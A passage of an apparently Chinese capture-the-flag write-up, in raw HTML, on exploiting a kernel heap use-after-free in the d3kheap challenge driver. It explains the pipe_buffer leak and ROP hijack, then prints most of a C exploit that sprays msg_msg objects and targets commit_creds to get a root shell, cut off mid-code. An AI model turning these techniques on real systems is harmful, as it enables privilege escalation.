class="comment">/**</span></span><br><span class="line"><span class="comment"> *struct pipe_buffer - a linux kernel pipe buffer</span></span><br><span class="line"><span class="comment"> *@page: the page containing the data for the pipe buffer</span></span><br><span class="line"><span class="comment"> *@offset: offset of data inside the @page</span></span><br><span class="line"><span class="comment"> *@len: length of data inside the @page</span></span><br><span class="line"><span class="comment"> *@ops: operations associated with this buffer. See @pipe_buf_operations.</span></span><br><span class="line"><span class="comment"> *@flags: pipe buffer flags. See above.</span></span><br><span class="line"><span class="comment"> *@private: private data owned by the ops.</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> offset, len;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> flags;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在 <code>pipe_buffer</code> 中存在一个函数表成员 <code>pipe_buf_operations</code> ，其指向内核中的函数表 <code>anon_pipe_buf_ops</code>，若我们能够将其读出，便能泄露出内核基址。</p><p>这里使用的方法是，使sk_buff指向这个UAF的堆块，并且他已经是free的状态，接着堆喷pipe_buffer，最后读出数据继续维持UAF状态。</p><h3 id="劫持执行流"><a href="#劫持执行流" class="headerlink" title="劫持执行流"></a>劫持执行流</h3><p>在上一步我们已经泄漏出基地址，并且此时pipe_buffer所指向的堆块还是free状态，所以我们可以继续利用sk_buff进行堆喷。最后修改ops指针指向我们上面泄漏出来的堆地址，最后跟上一篇文章一样进行ROP即可。</p><h3 id="综上，exp"><a href="#综上，exp" class="headerlink" title="综上，exp"></a>综上，exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_COPY 040000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_TAG 0xAAAAAAAA</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRIMARY_MSG_TYPE 0x41</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SECONDARY_MSG_TYPE 0x42</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_QUEUE_NUM 4096</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRIMARY_MSG_SIZE 96</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SECONDARY_MSG_SIZE 0x400</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> VICTIM_MSG_TYPE 0x1337</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SOCKET_NUM 32</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SK_BUFF_NUM 128</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PIPE_NUM 256</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PUSH_RSI_POP_RSP_POP_4VAL_RET 0xffffffff812dbede</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INIT_CRED 0xffffffff82c6d580</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COMMIT_CREDS 0xffffffff810d25c0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00ff0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> POP_RDI_RET 0xffffffff810938f0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errExit</span><span class="params">(<span class="keyword">char</span> *err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="keyword">long</span> m_type;</span><br><span class="line">    <span class="keyword">size_t</span> m_ts;    <span class="comment">/* message text size */</span></span><br><span class="line">    <span class="keyword">void</span> *next;     <span class="comment">/* struct msg_msgseg *next; */</span></span><br><span class="line">    <span class="keyword">void</span> *security; <span class="comment">/* NULL without SELinux */</span></span><br><span class="line">    <span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> page;</span><br><span class="line">    <span class="keyword">uint32_t</span> offset, len;</span><br><span class="line">    <span class="keyword">uint64_t</span> ops;</span><br><span class="line">    <span class="keyword">uint32_t</span> flags;</span><br><span class="line">    <span class="keyword">uint32_t</span> padding;</span><br><span class="line">    <span class="keyword">uint64_t</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> confirm;</span><br><span class="line">    <span class="keyword">uint64_t</span> release;</span><br><span class="line">    <span class="keyword">uint64_t</span> try_steal;</span><br><span class="line">    <span class="keyword">uint64_t</span> get;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msg) + <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msgseg)];</span><br><span class="line">&#125; oob_msg;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[PRIMARY_MSG_SIZE - <span class="keyword">sizeof</span>(struct msg_msg)];</span><br><span class="line">&#125; primary_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(struct msg_msg)];</span><br><span class="line">&#125; secondary_msg;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data :\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; (size / <span class="number">8</span>); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i / <span class="number">2</span> &lt; <span class="number">10</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d  &quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (i / <span class="number">2</span> &lt; <span class="number">100</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; %16llx&quot;</span>, *(<span class="keyword">size_t</span> *)(buf + i * <span class="number">8</span>));</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getShell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x1234</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">del</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0xDEAD</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *point_buf = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="keyword">int</span> victim_qid = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> sk_sockets[SOCKET_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> msqid[MSG_QUEUE_NUM];</span><br><span class="line">    <span class="keyword">char</span> fake_secondary_msg[<span class="number">704</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">nearby_msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">nearby_msg_prim</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> victim_addr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> search_addr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_addr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_base;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_offset;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">pipe_buf_ptr</span>;</span></span><br><span class="line">    <span class="keyword">int</span> pipe_fd[PIPE_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops_ptr</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *rop_chain;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, sk_sockets[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create socket pair!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/d3kheap&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open d3kheap error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT)) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create msg_queue!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] spray msg_msg, construct overlapping object\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;primary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(primary_msg));</span><br><span class="line">    <span class="built_in">memset</span>(&amp;secondary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(secondary_msg));</span><br><span class="line">    *(<span class="keyword">long</span> *)&amp;primary_msg = PRIMARY_MSG_TYPE;</span><br><span class="line">    *(<span class="keyword">long</span> *)&amp;secondary_msg = SECONDARY_MSG_TYPE;</span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;primary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line"></span><br><span class="line">    add();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        *(<span class="keyword">int</span> *)&amp;primary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">        *(<span class="keyword">int</span> *)&amp;primary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">        <span class="keyword">if</span> (msgsnd(msqid[i], &amp;primary_msg,</span><br><span class="line">                   <span class="keyword">sizeof</span>(primary_msg) - <span class="number">8</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to send primary msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        *(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">        *(<span class="keyword">int</span> 